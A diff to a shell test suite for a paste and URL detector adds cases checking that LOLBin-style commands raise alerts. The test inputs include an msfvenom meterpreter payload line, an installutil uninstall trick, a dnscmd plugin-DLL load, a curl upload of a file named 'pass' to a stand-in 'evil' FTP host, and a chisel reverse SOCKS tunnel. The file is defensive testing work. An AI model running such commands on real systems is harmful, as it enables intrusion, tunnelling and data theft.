@@ -11547,6 +11547,16 @@ check_url_hit 'daytime://evil.example/x' 'LOG' "url: daytime flagged"
 check_url_hit 'chargen://evil.example/x' 'LOG' "url: chargen flagged"
 check_url_hit 'https://www.example.com/' 'OK' "url: https clean"
 
+# ── cycle-183: paste LOLBin residual — msfvenom/installutil-u/dnscmd/
+#                curl-upload/chisel ────────────────────────────────────
+check "paste: msfvenom flagged" "$(./hlse_core paste 'msfvenom -p windows/x64/meterpreter LHOST=x' | head -1 | grep -c 'ALERT')" "1"
+check "paste: installutil-u flagged" "$(./hlse_core paste 'installutil /u evil.exe' | head -1 | grep -c 'ALERT')" "1"
+check "paste: dnscmd-dll flagged" "$(./hlse_core paste 'dnscmd /config /serverlevelplugindll x.dll' | head -1 | grep -c 'ALERT')" "1"
+check "paste: curl-upload flagged" "$(./hlse_core paste 'curl -T pass ftp://evil/x' | head -1 | grep -c 'ALERT')" "1"
+check "paste: chisel flagged" "$(./hlse_core paste 'chisel client x:8080 R:1080:socks' | head -1 | grep -c 'ALERT')" "1"
+check "paste: curl-download clean" "$(./hlse_core paste 'curl -o file.txt http://site/readme' | head -1 | grep -c 'OK')" "1"
+check "paste: installutil-legit clean" "$(./hlse_core paste 'installutil valid.dll' | head -1 | grep -c 'OK')" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
